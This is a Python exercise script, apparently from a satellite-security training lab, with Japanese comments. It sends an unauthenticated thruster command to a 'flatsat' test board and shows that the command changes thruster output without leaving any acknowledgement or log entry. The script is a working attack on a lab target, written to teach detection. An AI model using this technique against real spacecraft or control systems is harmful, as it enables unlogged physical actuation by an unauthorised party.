#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 02_command_injection_usb.py -- 相手が誰かを一度も確認しないコマンドの経路を
# 使って、物理的なもの（スラスター）を動かす。
#
# SET_THRUSTER (0x04) は2オクテット、スラスター番号と出力の生の値を受け取る。
# ファームウェアはどちらも許される範囲に制限（クランプ）しない。攻撃者は、
# あなたが守ったコマンドを狙う必要はない。守り忘れたコマンドを使えばよい。
#
# 問題の後半は「何も返ってこないこと」である。SET_THRUSTER は受領の返事
# （アクノリッジ）を送らないので、地上側には実行された記録が残らない。証拠は
# 状態の変化そのものだけで、それも次にテレメトリ（衛星から地上への状態報告）を
# 取ったときに、誰かが前後を比べた場合にしか見つからない。
#
# 予想される結果: ボードのコンソールと PWNSAT-C3 のメーターでスラスターの値が
# 変わる。しかし、コマンドログにはそれに対応する記録が何もない。

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import (FlatSat, TC_GET_PAYLOAD_STATUS, TC_GET_STATUS,  # noqa: E402
                     TC_SET_THRUSTER)

# スラスターの値は STATUS ではなく SEND_TM (0x08) に載っている。SEND_TM は
# 14〜30秒ごとに送られる定期報告（ハートビート）である。以前のこの演習のように
# STATUS を問い合わせても、見えるのは STATUS に載る値（運用者が普段見ている情報）だけで、スラスターの変化は決して見えない。
TM_THRUSTER_OFFSET = 17


def read_thrusters(fsat, seq, wait=35.0):
    """次に届く SEND_TM から、2つのスラスターの出力を読む。届かなければ None。"""
    for p in fsat.send(TC_GET_PAYLOAD_STATUS, b"", seq=seq & 0x3FFF, listen=wait):
        if p.apid != 0x08:
            continue
        body = fsat.plaintext(p)
        if len(body) > TM_THRUSTER_OFFSET + 1:
            return (body[TM_THRUSTER_OFFSET], body[TM_THRUSTER_OFFSET + 1])
    return None


def fmt(pair):
    return "not seen yet" if pair is None else f"0={pair[0]}  1={pair[1]}"


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--thruster-id", type=int, choices=[0, 1], default=0)
    ap.add_argument("--power", type=int, default=200, metavar="0-255")
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--restore", action="store_true", help="set the power back to zero")
    ap.add_argument("--cleartext", action="store_true")
    args = ap.parse_args()
    if not 0 <= args.power <= 255:
        ap.error("--power must be 0-255")

    with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
        print("\n=== 1. state before ===")
        fsat.send(TC_GET_STATUS, b"", seq=args.seq, listen=1.2)
        before = read_thrusters(fsat, args.seq + 10)
        print(f"[*] thrusters before: {fmt(before)}")

        print(f"\n=== 2. thruster {args.thruster_id} to {args.power}, no credential ===")
        replies = fsat.send(TC_SET_THRUSTER,
                            bytes([args.thruster_id & 0xFF, args.power & 0xFF]),
                            seq=args.seq + 1, listen=1.0)
        for p in replies:
            if p.apid == 0x09:
                reason = fsat.plaintext(p).split(b"\x00", 1)[0]
                print(f"[!] the board refused: "
                      f"{reason.decode('ascii', 'replace').strip()}")
        print("[*] Note what did NOT come back: SET_THRUSTER acknowledges nothing.")

        print("\n=== 3. state after ===")
        after = read_thrusters(fsat, args.seq + 11)
        print(f"[*] thrusters after:  {fmt(after)}")

        if before is None or after is None:
            print("[*] no telemetry frame arrived in the window. The values "
                  "are on the PWNSAT-C3 panel; give it half a minute.")
        elif after[args.thruster_id] == args.power:
            print(f"[+] thruster {args.thruster_id} is at {args.power}, and "
                  f"nothing authenticated the command that put it there.")
        elif before == after:
            print("[-] the values did not move. The command was accepted and "
                  "had no effect, which is worth a finding of its own.")

        if args.restore:
            print("\n=== 4. putting it back ===")
            fsat.send(TC_SET_THRUSTER, bytes([args.thruster_id & 0xFF, 0]),
                      seq=args.seq + 3, listen=1.0)

    print("\nWatch the telemetry panel, not the console's own log. The gap "
          "between them is the finding.")
    print("\nWhat the sensor should have shown: a critical command that executed "
          "with the secure link off.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
